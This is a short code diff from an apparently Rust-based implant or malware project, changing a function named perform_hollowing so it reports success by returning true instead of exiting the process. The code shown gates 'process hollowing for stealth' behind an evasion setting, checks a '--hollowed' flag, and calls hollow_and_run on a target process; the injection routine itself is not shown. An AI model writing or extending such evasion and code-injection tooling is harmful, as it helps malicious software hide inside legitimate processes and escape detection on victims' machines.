@@ -44,15 +44,15 @@ const CONTEXT_AMD64_FULL: u32 = CONTEXT_AMD64 | 0x1 | 0x2 | 0x4;
 const IMAGE_REL_BASED_DIR64: u16 = 10;
 const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
 
-pub async fn perform_hollowing() {
+pub async fn perform_hollowing() -> bool {
     if !RecoveryControl::global().evasion_enabled() {
-        return;
+        return false;
     }
 
     let args: Vec<String> = env::args().collect();
     if args.contains(&"--hollowed".to_string()) {
         debug!("already running in hollowed process");
-        return;
+        return false;
     }
 
     info!("attempting process hollowing for stealth");
@@ -67,13 +67,14 @@ pub async fn perform_hollowing() {
     match hollow_and_run(target) {
         Ok(_) => {
             info!(
-                "successfully hollowed into {}, exiting original process",
+                "successfully hollowed into {}, signaling for exit",
                 target
             );
-            std::process::exit(0);
+            true
         }
         Err(e) => {
             error!("process hollowing failed: {}", e);
+            false
         }
     }
 }
